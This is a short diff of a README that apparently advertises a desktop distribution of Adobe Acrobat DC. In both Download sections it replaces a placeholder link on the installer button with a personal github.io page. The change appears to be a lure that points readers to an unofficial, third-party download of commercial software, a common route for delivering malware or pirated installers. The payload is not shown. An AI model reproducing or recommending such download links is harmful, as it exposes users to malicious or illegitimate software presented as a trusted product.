@@ -17,7 +17,7 @@ The distribution supports common document formats used in day to day office and 
 ## 01 · ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cindy-murray-39.github.io/acrobat-dc-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
@@ -224,7 +224,7 @@ Coexistence with an existing installation is supported when the program director
 ## ⬇️ Download
 
 <p align="center">
-  <a href="https://example.com">
+  <a href="https://cindy-murray-39.github.io/acrobat-dc-desktop">
     <picture>
       <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
       <img src="docs/buttons/installer-card.svg" alt="" width="440">
